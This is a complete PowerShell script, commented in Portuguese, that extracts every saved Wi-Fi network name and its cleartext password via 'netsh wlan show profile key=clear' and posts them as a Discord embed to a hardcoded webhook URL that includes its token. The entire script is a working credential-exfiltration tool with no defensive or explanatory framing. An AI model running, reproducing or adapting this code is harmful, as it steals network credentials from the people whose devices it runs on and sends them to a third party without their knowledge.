$Webhook="https://discord.com/api/webhooks/1391925819017793566/P6u2qHAbmqSFeu94T1beCpyWBO6khVVdCK66sy8a083xDZqRSyY5w5PDHDciVnh2ImDB"
$profiles=netsh wlan show profile | ForEach-Object { ($_ -split ':')[1].Trim() } | Where-Object { $_ -ne "" }

$fields = @()

foreach ($p in $profiles) {
    $details=netsh wlan show profile name="$p" key=clear
    $passLine=$details | Select-String "Key Content|Contenuto chiave|Inhaltsschl|Contenido de la clave"
    
    if ($passLine) { 
        $password=($passLine -split ':')[1].Trim() 
    } else { 
        $password='[Sem senha]' 
    }
    
    $fields += @{
        name = "📶 $p"
        value = "**Senha:** ```$password```"
        inline = $false
    }
}

if ($fields.Count -eq 0) {
    $fields = @(
        @{
            name = "❌ Nenhuma rede encontrada"
            value = "Não foram detectadas redes Wi-Fi salvas"
            inline = $false
        }
    )
}

$embed = @{
    title = "🔍 Relatório de Redes Wi-Fi"
    description = "Redes salvas neste dispositivo"
    color = 3447003  # Cor azul
    fields = $fields
    footer = @{
        text = "Total de redes: $($profiles.Count) | $(Get-Date -Format 'dd/MM/yyyy HH:mm')"
    }
    timestamp = Get-Date -Format "yyyy-MM-ddTHH:mm:ss.fffZ"
}

$payload = @{
    embeds = @($embed)
    username = "Wi-Fi Scanner"
    avatar_url = "https://cdn-icons-png.flaticon.com/512/284/284687.png"
}

$json = $payload | ConvertTo-Json -Depth 10
Invoke-RestMethod -Uri $Webhook -Method Post -Body $json -ContentType "application/json"
